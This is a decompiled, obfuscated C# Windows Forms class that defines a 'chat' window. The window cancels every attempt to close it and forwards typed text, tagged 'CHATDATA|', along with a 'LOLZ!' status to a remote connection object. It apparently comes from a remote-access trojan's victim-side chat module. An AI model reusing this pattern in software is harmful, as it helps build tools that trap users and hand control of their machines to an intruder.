using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

[DesignerGenerated]
public sealed class chat : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("TextBox1")]
	private TextBox textBox_0;

	[AccessedThroughProperty("Button1")]
	private Button button_0;

	[AccessedThroughProperty("ListBox1")]
	private ListBox listBox_0;

	public chat()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)chat_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(chat_FormClosing));
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		vmethod_1(new TextBox());
		vmethod_3(new Button());
		vmethod_5(new ListBox());
		((Control)this).SuspendLayout();
		TextBox obj = vmethod_0();
		Point location = new Point(12, 308);
		((Control)obj).set_Location(location);
		((Control)vmethod_0()).set_Name("TextBox1");
		TextBox obj2 = vmethod_0();
		Size size = new Size(376, 20);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(5);
		vmethod_2().set_DialogResult((DialogResult)2);
		Button obj3 = vmethod_2();
		location = new Point(394, 307);
		((Control)obj3).set_Location(location);
		((Control)vmethod_2()).set_Name("Button1");
		Button obj4 = vmethod_2();
		size = new Size(75, 23);
		((Control)obj4).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(4);
		((ButtonBase)vmethod_2()).set_Text("Send");
		((ButtonBase)vmethod_2()).set_UseVisualStyleBackColor(true);
		((ListControl)vmethod_4()).set_FormattingEnabled(true);
		ListBox obj5 = vmethod_4();
		location = new Point(12, 12);
		((Control)obj5).set_Location(location);
		((Control)vmethod_4()).set_Name("ListBox1");
		ListBox obj6 = vmethod_4();
		size = new Size(457, 290);
		((Control)obj6).set_Size(size);
		((Control)vmethod_4()).set_TabIndex(3);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(484, 342);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).set_Cursor(Cursors.get_Default());
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("chat");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual TextBox vmethod_0()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(TextBox textBox_1)
	{
		textBox_0 = textBox_1;
	}

	[SpecialName]
	internal virtual Button vmethod_2()
	{
		return button_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(Button button_1)
	{
		EventHandler eventHandler = method_0;
		if (button_0 != null)
		{
			((Control)button_0).remove_Click(eventHandler);
		}
		button_0 = button_1;
		if (button_0 != null)
		{
			((Control)button_0).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual ListBox vmethod_4()
	{
		return listBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_5(ListBox listBox_1)
	{
		listBox_0 = listBox_1;
	}

	private void chat_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void chat_Load(object sender, EventArgs e)
	{
	}

	private void method_0(object sender, EventArgs e)
	{
		Class1.Class2_0.method_2().Send("CHATDATA|" + vmethod_0().get_Text());
		vmethod_0().set_Text("");
		Class1.Class2_0.method_2().SendStatus("LOLZ!");
	}

	private void method_1(object sender, EventArgs e)
	{
	}
}
